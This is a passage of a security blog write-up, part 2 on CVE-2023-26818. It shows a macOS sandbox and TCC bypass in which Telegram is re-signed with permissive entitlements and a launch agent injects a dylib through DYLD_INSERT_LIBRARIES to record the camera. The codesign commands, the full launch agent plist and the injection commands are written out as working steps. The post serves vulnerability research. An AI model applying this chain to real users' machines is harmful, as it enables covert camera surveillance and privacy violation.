+
+<p> </p>
+
+<p>I see the second reason as more logical. Because <code class="language-plaintext highlighter-rouge">launchd</code> implementation has these thoughts to make sure the app is running as it</p>
+
+<p>has to. Now, After we made almost everything clear, We can start to exploit the <code class="language-plaintext highlighter-rouge">CVE-2023-26818</code> while the sandbox is</p>
+
+<p>activated.</p>
+
+<p> </p>
+
+<h1 id="exploitation"><strong>Exploitation</strong></h1>
+
+<p>What we need now is to reassign the <code class="language-plaintext highlighter-rouge">Entitlements</code> to telegram and set the sandbox to <code class="language-plaintext highlighter-rouge">true</code>, In the first part, we explained</p>
+
+<p>how to do tho, but we will show it again with the changes (<code class="language-plaintext highlighter-rouge">Only the signing part</code>). The following are the <code class="language-plaintext highlighter-rouge">Entitlements</code> we</p>
+
+<p>need:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+&lt;plist version="1.0"&gt;
+&lt;dict&gt;
+    &lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;
+    &lt;true/&gt;
+    &lt;key&gt;com.apple.security.application-groups&lt;/key&gt;
+    &lt;array&gt;
+        &lt;string&gt;6N38VWS5BX.ru.keepcoder.Telegram&lt;/string&gt;
+        &lt;string&gt;6N38VWS5BX.ru.keepcoder.Telegram.TelegramShare&lt;/string&gt;
+    &lt;/array&gt;
+    &lt;key&gt;com.apple.security.cs.allow-dyld-environment-variables&lt;/key&gt;
+    &lt;true/&gt;
+    &lt;key&gt;com.apple.security.cs.disable-library-validation&lt;/key&gt;
+    &lt;true/&gt;
+    &lt;key&gt;com.apple.security.device.audio-input&lt;/key&gt;
+    &lt;true/&gt;
+    &lt;key&gt;com.apple.security.device.camera&lt;/key&gt;
+    &lt;true/&gt;
+    &lt;key&gt;com.apple.security.personal-information.location&lt;/key&gt;
+    &lt;true/&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre></div></div>
+
+<p> </p>
+
+<p>Let’s remove <code class="language-plaintext highlighter-rouge">telegram</code> app signing:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>codesign --remove-signature --no-strict /Applications/Telegram.app
+</code></pre></div></div>
+
+<p> </p>
+
+<p>Now, Let’s sign it using our <code class="language-plaintext highlighter-rouge">Entitlements</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>codesign --force --deep --sign "Developer ID" --entitlements entit.plist /Applications/Telegram.app
+</code></pre></div></div>
+
+<p> </p>
+
+<p>Finally, Let’s take a look at the signing information:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>codesign -dv --entitlements - /Applications/Telegram.app
+</code></pre></div></div>
+
+<p> </p>
+
+<p> </p>
+
+<p><img src="/assets/images/e9326812e03e6546697d96f8cdbec4b8" alt="" /></p>
+
+<p> </p>
+
+<p>We can see clearly that the <code class="language-plaintext highlighter-rouge">sandbox</code> is activated and if we open the activity monitor app we can see it clearly as the following:</p>
+
+<p> </p>
+
+<p><img src="/assets/images/6291fb4d72ee945334b604da3fa56ea6" alt="" /></p>
+
+<p> </p>
+
+<p>Now, Oppiste to the exploitation way we did in the first part without the <code class="language-plaintext highlighter-rouge">sandbox</code>, We are going to use the <code class="language-plaintext highlighter-rouge">Launch Agent</code> to</p>
+
+<p>do tho, So we can bypass the <code class="language-plaintext highlighter-rouge">sandbox</code>. Here is the agent <code class="language-plaintext highlighter-rouge">plist</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+&lt;plist version="1.0"&gt;
+&lt;dict&gt;
+       &lt;key&gt;Label&lt;/key&gt;
+        &lt;string&gt;com.telegram.launcher&lt;/string&gt;
+        &lt;key&gt;RunAtLoad&lt;/key&gt;
+        &lt;true/&gt;
+        &lt;key&gt;EnvironmentVariables&lt;/key&gt;
+        &lt;dict&gt;
+          &lt;key&gt;DYLD_INSERT_LIBRARIES&lt;/key&gt;
+          &lt;string&gt;/Users/labatrixteam/telegram/Camexploit.dylib&lt;/string&gt;
+        &lt;/dict&gt;
+        &lt;key&gt;ProgramArguments&lt;/key&gt;
+        &lt;array&gt;
+  &lt;string&gt;/Applications/Telegram.app/Contents/MacOS/Telegram&lt;/string&gt;
+        &lt;/array&gt;
+        &lt;key&gt;StandardOutPath&lt;/key&gt;
+        &lt;string&gt;/tmp/telegram.log&lt;/string&gt;
+        &lt;key&gt;StandardErrorPath&lt;/key&gt;
+        &lt;string&gt;/tmp/telegram.log&lt;/string&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre></div></div>
+
+<p> </p>
+
+<p>The explanation for the essential keys is as we explained before in the previous example, But we gonna explain the simple</p>
+
+<p>differences:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;key&gt;RunAtLoad&lt;/key&gt;
+&lt;true/&gt;
+</code></pre></div></div>
+
+<p> </p>
+
+<p>Specifies that the program associated with this agent should be executed as soon as the agent is loaded.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;key&gt;EnvironmentVariables&lt;/key&gt;
+&lt;dict&gt;
+    &lt;key&gt;DYLD_INSERT_LIBRARIES&lt;/key&gt;
+    &lt;string&gt;/Users/labatrixteam/telegram/Camexploit.dylib&lt;/string&gt;
+&lt;/dict&gt;
+</code></pre></div></div>
+
+<p> </p>
+
+<p>This section sets an environment variable <code class="language-plaintext highlighter-rouge">DYLD_INSERT_LIBRARIES</code> for the agent which specific environment variable for</p>
+
+<p>dynamic libraries to be loaded before any others which instructs the system to load the</p>
+
+<p><code class="language-plaintext highlighter-rouge">/Users/labatrixteam/telegram/Camexploit.dylib</code> library when launching <code class="language-plaintext highlighter-rouge">Telegram</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;key&gt;ProgramArguments&lt;/key&gt;
+&lt;array&gt;
+    &lt;string&gt;/Applications/Telegram.app/Contents/MacOS/Telegram&lt;/string&gt;
+&lt;/array&gt;
+</code></pre></div></div>
+
+<p> </p>
+
+<p>it’s set to run the main executable for the Telegram application.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;key&gt;StandardOutPath&lt;/key&gt;
+&lt;string&gt;/tmp/telegram.log&lt;/string&gt;
+&lt;key&gt;StandardErrorPath&lt;/key&gt;
+&lt;string&gt;/tmp/telegram.log&lt;/string&gt;
+</code></pre></div></div>
+
+<p>specify where the standard output and standard error streams of the agent should be directed. Now, Let’s run telegram without</p>
+
+<p>our agent and see what will happen and then save our agent and load it using <code class="language-plaintext highlighter-rouge">launchctl</code> to see how the sandbox will be bypassed:</p>
+
+<p> </p>
+
+<ul>
+  <li>W/o <code class="language-plaintext highlighter-rouge">Launch Agent</code>:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DYLD_INSERT_LIBRARIES=Camexploit.dylib /Applications/Telegram.app/Contents/MacOS/Telegram
+</code></pre></div></div>
+
+<p> </p>
+
+<p><img src="/assets/images/290259ae00b8457cc4e23d54aadca324" alt="" /></p>
+
+<p> </p>
+
+<p>Here we can see it fails because of the sandbox. Now, Let’s give it a shot with our <code class="language-plaintext highlighter-rouge">Launch Agent</code>.</p>
+
+<p> </p>
+
+<ul>
+  <li>W/ <code class="language-plaintext highlighter-rouge">Launch Agent</code>:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.telegram.launcher.plist
+</code></pre></div></div>
+
+<p> </p>
+
+<p><img src="/assets/images/13385289547e27a28c1f507efe3fbabd" alt="" /></p>
+
+<p> </p>
+
+<p>We can see that it’s recorded successfully and the recorded video path is in the <code class="language-plaintext highlighter-rouge">log</code> file we identified for the output.</p>
+
+<p> </p>
+
+<h1 id="conclusion"><strong>Conclusion</strong></h1>
+
+<p>In part 2 we were able to discuss and understand more about <code class="language-plaintext highlighter-rouge">launchd</code>, <code class="language-plaintext highlighter-rouge">sandbox</code>, <code class="language-plaintext highlighter-rouge">Powerbox API</code> and many more. We saw how the</p>
+
+<p><code class="language-plaintext highlighter-rouge">sandbox</code> on <code class="language-plaintext highlighter-rouge">macOS</code> can be bypassed using the <code class="language-plaintext highlighter-rouge">Launch Agent</code> &amp; Show 2 theoretical reasons why this could lead to the bypass.</p>
+
+<p>Finally, We may come up with a blog explaining the <code class="language-plaintext highlighter-rouge">sandbox</code> more deeply by reversing &amp; debugging it and exploring more of the</p>
+
+<p><code class="language-plaintext highlighter-rouge">MocOS</code> system internal to see how all of this happens in action and approve the 100% reason of why the bypass happen.</p>
+
+<p> </p>
+
+<h1 id="resources"><strong>Resources</strong></h1>
+
+<ul>
+  <li>
+    <p>https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://lapcatsoftware.com/articles/sandbox-escape.html</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p><a href="https://web.archive.org/web/20170412191246mp_/https://developer.apple.com/library/content/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html#//apple_ref/doc/uid/TP40011183-CH1-SW1">https://web.archive.org/web/20170412191246mp_/https://developer.apple.com/library/content/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html#//apple_ref/doc/uid/TP40011183-CH1-SW1</a></p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://www.cnet.com/tech/computing/what-apples-sandboxing-means-for-developers-and-users/</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://www.maketecheasier.com/how-macos-app-sandboxing-protects-users/</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://www.karltarvas.com/macos-app-sandboxing-via-sandbox-exec.html</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://www.quora.com/How-does-the-app-sandbox-architecture-work-in-macOS</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p><a href="https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox">https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox#</a></p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://desi-jarvis.medium.com/office365-macos-sandbox-escape-fcce4fa4123c</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-sandbox-debug-and-bypass</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://newosxbook.com/files/HITSB.pdf</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://www.youtube.com/watch?v=mG715HcDgO8</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p><a href="https://conference.hitb.org/hitbsecconf2021ams/materials/D1T1%20-%20MacOS%20Local%20Security%20-%20Escaping%20the%20Sandbox%20and%20Bypassing%20TCC%20-%20Thijs%20Alkemade%20&amp;%20Daan%20Keuper.pdf">https://conference.hitb.org/hitbsecconf2021ams/materials/D1T1 - MacOS Local Security - Escaping the Sandbox and Bypassing TCC - Thijs Alkemade &amp; Daan Keuper.pdf</a></p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://www.mdsec.co.uk/2018/08/escaping-the-sandbox-microsoft-office-on-macos/</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://nakedsecurity.sophos.com/2011/11/14/apples-os-x-sandbox-has-a-gaping-hole-or-not/</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://www.computerworld.com/article/2734310/researchers-bypass-the-restrictions-of-mac-os-x-default-sandbox-profiles.html</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://www.youtube.com/watch?v=vMGiplQtjTY</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://www.appcoda.com/mac-app-sandbox/</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p><a href="https://wiki.freepascal.org/Sandboxing_for_macOS">https://wiki.freepascal.org/Sandboxing_for_macOS</a></p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://www.macwelt.de/article/959302/festung-mac-teil-i.html</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://github.com/saagarjha/macOSSandboxInitializationBypass</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p><a href="https://developer.apple.com/documentation/security/app_sandbox">https://developer.apple.com/documentation/security/app_sandbox</a></p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://www.manpagez.com/man/7/sandbox/</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://medium.com/@boutnaru/the-macos-process-journey-sandboxd-sandbox-daemon-17c8c0efe8c9</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox</p>
+  </li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#macos" class="page__taxonomy-item" rel="tag">MacOS</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-08-29T00:00:00+08:00">August 29, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/macos/CVE_2023_26818_P1/" class="pagination--pager" title="CVE-2023-26818 Part1: MacOS TCC Bypass with telegram using DyLib Injection
+">Previous</a>
+    
+    
+      <a href="/macos/CVE_2023_26818_exploit_P1/" class="pagination--pager" title="Exploit Writing Part 1: CVE-2023-26818 MacOS TCC Bypass W/ telegram
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2024 Zeyad Azima. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
